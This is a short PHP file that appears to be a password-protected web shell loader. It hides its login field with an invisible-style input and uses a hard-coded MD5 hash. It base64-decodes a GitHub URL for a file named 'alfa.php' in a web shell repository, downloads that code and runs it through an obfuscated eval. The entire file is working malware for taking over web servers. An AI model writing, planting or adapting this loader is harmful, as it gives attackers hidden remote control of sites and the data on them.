<?php

$password = "e1120ab4122ab3bf38a7d00f9933c3d9";
if(isset($_POST['password'])) {
    if(md5($_POST['password']) == $password) {
        setcookie('auth', md5($password));
        header("Refresh:0");
    }
}
if(isset($_COOKIE)) {
    if($_COOKIE['auth'] != md5($password)) {
        echo "<form method=POST action=''><input type='password' name='password' style='outline: none; border: none'></form>";
        die();
    }
}

$file = file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1a2FuLWhlbmdrZXIvbGlzdC13ZWJzaGVsbC9yZWZzL2hlYWRzL21haW4vYWxmYS5waHA="));
EvAL ("?>" . $file);
